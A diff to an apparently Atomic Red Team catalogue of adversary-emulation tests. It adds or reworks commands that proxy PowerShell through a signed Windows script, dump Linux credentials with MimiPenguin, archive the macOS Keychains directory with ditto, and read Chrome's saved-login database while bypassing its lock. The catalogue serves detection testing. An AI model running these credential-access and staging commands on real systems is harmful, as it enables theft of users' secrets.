@@ -16272,7 +16272,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.723Z'
-      name: SyncAppvPublishingServer
+      name: 'System Script Proxy Execution: SyncAppvPublishingServer'
       description: "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution
         of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands.
         SyncAppvPublishingServer.vbs is a Visual Basic script associated with how
@@ -16304,7 +16304,25 @@ stealth:
       x_mitre_platforms:
       - Windows
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1216.002
+    atomic_tests:
+    - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
+      auto_generated_guid: 275d963d-3f36-476c-8bef-a2a3960ee6eb
+      description: |
+        Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
+        Upon execution, calc.exe will be launched.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A PowerShell command to execute.
+          type: string
+          default: Start-Process calc
+      executor:
+        command: 'C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
+
+          '
+        name: command_prompt
   T1027.018:
     technique:
       type: attack-pattern
@@ -16916,6 +16934,18 @@ stealth:
         get_prereq_command: |
           New-Item -Type Directory (split-path "#{local_xsl_file}") -ErrorAction Ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
+      - description: 'wmic.exe must be present on the system. It is disabled by default
+          on Windows 11, version 24H2 and later, and removed when upgrading to version
+          25H2.
+
+          '
+        prereq_command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit
+          0} else {exit 1}
+
+          '
+        get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+          '
       executor:
         command: 'wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
 
@@ -16939,6 +16969,20 @@ stealth:
           description: WMI command to execute using wmic.exe
           type: string
           default: process list
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'wmic.exe must be present on the system. It is disabled by default
+          on Windows 11, version 24H2 and later, and removed when upgrading to version
+          25H2.
+
+          '
+        prereq_command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit
+          0} else {exit 1}
+
+          '
+        get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+          '
       executor:
         command: 'wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
 
@@ -17952,23 +17996,6 @@ stealth:
       x_mitre_version: '3.0'
       identifier: T1216
     atomic_tests:
-    - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
-      auto_generated_guid: 275d963d-3f36-476c-8bef-a2a3960ee6eb
-      description: |
-        Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
-        Upon execution, calc.exe will be launched.
-      supported_platforms:
-      - windows
-      input_arguments:
-        command_to_execute:
-          description: A PowerShell command to execute.
-          type: string
-          default: Start-Process calc
-      executor:
-        command: 'C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
-
-          '
-        name: command_prompt
     - name: manage-bde.wsf Signed Script Command Execution
       auto_generated_guid: 2a8f2d3c-3dec-4262-99dd-150cb2a4d63a
       description: 'Executes the signed manage-bde.wsf script with options to execute
@@ -35304,6 +35331,20 @@ execution:
         on the command line.\n"
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'wmic.exe must be present on the system. It is disabled by default
+          on Windows 11, version 24H2 and later, and removed when upgrading to version
+          25H2.
+
+          '
+        prereq_command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit
+          0} else {exit 1}
+
+          '
+        get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+          '
       executor:
         command: 'wmic useraccount get /ALL /format:csv
 
@@ -35316,6 +35357,20 @@ execution:
         When the test completes , there should be running processes listed on the command line.
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'wmic.exe must be present on the system. It is disabled by default
+          on Windows 11, version 24H2 and later, and removed when upgrading to version
+          25H2.
+
+          '
+        prereq_command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit
+          0} else {exit 1}
+
+          '
+        get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+          '
       executor:
         command: 'wmic process get caption,executablepath,commandline /format:csv
 
@@ -35328,6 +35383,20 @@ execution:
         When the test completes, there should be a list of installed patches and when they were installed.
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'wmic.exe must be present on the system. It is disabled by default
+          on Windows 11, version 24H2 and later, and removed when upgrading to version
+          25H2.
+
+          '
+        prereq_command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit
+          0} else {exit 1}
+
+          '
+        get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+          '
       executor:
         command: 'wmic qfe get description,installedOn /format:csv
 
@@ -65975,6 +66044,9 @@ command-and-control:
           HIGH #{remote_file} #{local_path}
 
           '
+        cleanup_command: 'del #{local_path} >nul 2>&1
+
+          '
         name: command_prompt
     - name: Windows - PowerShell Download
       auto_generated_guid: 42dc4460-9aa6-45d3-b1a6-3955d34e1fe8
@@ -67079,7 +67151,9 @@ command-and-control:
         name: bash
         elevation_required: false
         command: 'kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm
-          -it -- curl -ksL #{remote_url}'
+          -it -- curl -ksL #{remote_url}
+
+          '
   T1665:
     technique:
       type: attack-pattern
@@ -68236,6 +68310,55 @@ collection:
 
           Add-Type -AssemblyName System.IO.Compression.FileSystem
           [System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+    - name: Data Compressed - macOS - ditto Archive of a Sensitive Directory
+      auto_generated_guid: 2794f321-55c4-4484-9eef-0557996f715a
+      description: |
+        Uses `ditto`, Apple's own copy and archive utility, to compress a directory holding sensitive data into a
+        single zip archive, which is the staging step that normally precedes exfiltration.
+
+        `ditto` is the tool macOS infostealers reach for rather than `zip` or `tar`, because it preserves resource
+        forks and extended attributes, so the archive survives a round trip with macOS metadata intact. CyberProof's
+        AMOS analysis describes the malware aggregating Keychain files, browser credentials and wallet data and
+        compressing them "into a single archive named `osalogging.zip` within the `/tmp` directory using native macOS
+        utilities like `ditto`". [LOOBins](https://www.loobins.io/binaries/ditto/) lists the same
+        `ditto -c -k --sequesterRsrc --keepParent` form under Collection and Exfiltration, and notes there was no
+        detection content for the binary at the time of writing.
+
+        The default source is the user's Keychains directory, which exists on every macOS install and is the highest
+        value target of the real technique. Both the source and the destination are input arguments, so the test can
+        be pointed at a directory of your choosing instead.
+
+        Upon successful execution, a zip archive is created at the output path and its size is printed.
+      supported_platforms:
+      - macos
+      input_arguments:
+        source_path:
+          description: Directory that gets archived
+          type: path
+          default: "$HOME/Library/Keychains"
+        output_file:
+          description: Path of the archive that is created
+          type: path
+          default: "/tmp/T1560.001_ditto_archive.zip"
+      dependencies:
+      - description: 'The source directory #{source_path} must exist
+
+          '
+        prereq_command: 'if [ -d "#{source_path}" ]; then exit 0; else exit 1; fi
+
+          '
+        get_prereq_command: 'mkdir -p #{source_path}
+
+          '
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'ditto -c -k --sequesterRsrc --keepParent "#{source_path}" "#{output_file}"
+
+          '
+        cleanup_command: 'rm -f "#{output_file}"
+
+          '
   T1113:
     technique:
       type: attack-pattern
@@ -88450,8 +88573,7 @@ credential-access:
         MimiPenguin_Location:
           description: Path of MimiPenguin script
           type: path
-          default: "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
-      dependency_executor_name: sh
+          default: PathToAtomicsFolder/../ExternalPayloads/mimipenguin/mimipenguin.sh
       dependencies:
       - description: 'MimiPenguin script must exist on disk at specified location
           (#{MimiPenguin_Location})
@@ -88462,9 +88584,10 @@ credential-access:
 
           '
         get_prereq_command: |
-          wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
-          mkdir /tmp/mimipenguin
-          tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
+          payload_dir=$(dirname "#{MimiPenguin_Location}")
+          mkdir -p "$payload_dir"
+          wget -O "$payload_dir/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+          tar -xzf "$payload_dir/mimipenguin.tar.gz" --strip-components=1 -C "$payload_dir"
       - description: 'Strings must be installed
 
           '
@@ -88482,7 +88605,9 @@ credential-access:
           else exit 1; fi;
 
           '
-        get_prereq_command: "sudo apt-get -y install python2       \n"
+        get_prereq_command: 'sudo apt-get -y install python2
+
+          '
       - description: 'Libc-bin must be installed
 
           '
@@ -88490,14 +88615,16 @@ credential-access:
           exit 1; fi;
 
           '
-        get_prereq_command: "sudo apt-get -y install libc-bin        \n"
-      executor:
-        command: |
-          sudo #{MimiPenguin_Location} > #{output_file}
-          cat #{output_file}
-        cleanup_command: 'rm -f #{output_file} > /dev/null
+        get_prereq_command: 'sudo apt-get -y install libc-bin
 
           '
+      executor:
+        command: |
+          sudo bash "#{MimiPenguin_Location}" > "#{output_file}"
+          cat "#{output_file}"
+        cleanup_command: |
+          rm -f #{output_file} > /dev/null
+          rm -rf $(dirname "#{MimiPenguin_Location}")
         name: bash
         elevation_required: true
   T1555.005:
@@ -90841,6 +90968,63 @@ credential-access:
 
           '
         cleanup_command: 'del /f /q #{output_path} > nul 2>&1
+
+          '
+    - name: Query Chrome Login Data In Place with sqlite3 - MacOS
+      auto_generated_guid: 29d0c390-3cbc-4e4e-a52b-a1350ed836b7
+      description: |
+        Reads Google Chrome's `Login Data` SQLite database in place with the Apple-signed `/usr/bin/sqlite3`
+        binary, instead of copying the database somewhere else first. The saved origin URLs and usernames are
+        written to the output file. Passwords stay in the `password_value` BLOB column and remain encrypted with
+        the Chrome Safe Storage key, so this test collects the credential index rather than plaintext secrets.
+
+        The `?immutable=1` URI parameter is the part that matters. Chrome holds a lock on the database while it
+        is running, and a plain `sqlite3 "<path>" "SELECT ..."` fails with `Error: in prepare, database is locked (5)`.
+        Opening the file through a `file:` URI with `immutable=1` reads it without taking a lock, so the test works
+        against a live browser and does not need to kill Chrome first, which is what the published LOOBins one-liner
+        for Firefox does.
+
+        This matters for detection because `sqlite3` ships with macOS and is signed by Apple, so controls that key
+        on code signing trust or on an unknown binary touching the profile directory do not fire on it.
+
+        [LOOBins sqlite3](https://www.loobins.io/binaries/sqlite3/) documents the same binary being used against
+        browser cookie databases. [Red Canary](https://redcanary.com/blog/threat-intelligence/clipping-silver-sparrows-wings/)
+        documented macOS malware invoking the `sqlite3` CLI, and
+        [Jamf](https://www.jamf.com/blog/crashstealer-macos-infostealer-analysis/) documented a macOS infostealer
+        working around the same database lock through the SQLite backup API.
+
+        Upon successful execution, the output file contains one line per saved login in the form
+        `origin_url|username_value`. If Chrome has no saved logins the file is created and left empty.
+      supported_platforms:
+      - macos
+      input_arguments:
+        chrome_profile:
+          description: Name of the Chrome profile directory to read
+          type: string
+          default: Default
+        output_file:
+          description: Path the query results are written to
+          type: path
+          default: "/tmp/T1555.003_chrome_logins.txt"
+      dependencies:
+      - description: 'Chrome''s Login Data database must exist for profile #{chrome_profile}
+
+          '
+        prereq_command: 'if [ -f "$HOME/Library/Application Support/Google/Chrome/#{chrome_profile}/Login
+          Data" ]; then exit 0; else exit 1; fi
+
+          '
+        get_prereq_command: |
+          brew install --cask google-chrome
+          xattr -d com.apple.quarantine "/Applications/Google Chrome.app"
+          open -a "Google Chrome" && sleep 5 && killall -KILL "Google Chrome"
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          sqlite3 "file:$HOME/Library/Application Support/Google/Chrome/#{chrome_profile}/Login Data?immutable=1" "SELECT origin_url, username_value FROM logins;" > "#{output_file}"
+          cat "#{output_file}"
+        cleanup_command: 'rm -f "#{output_file}"
 
           '
   T1557.003:
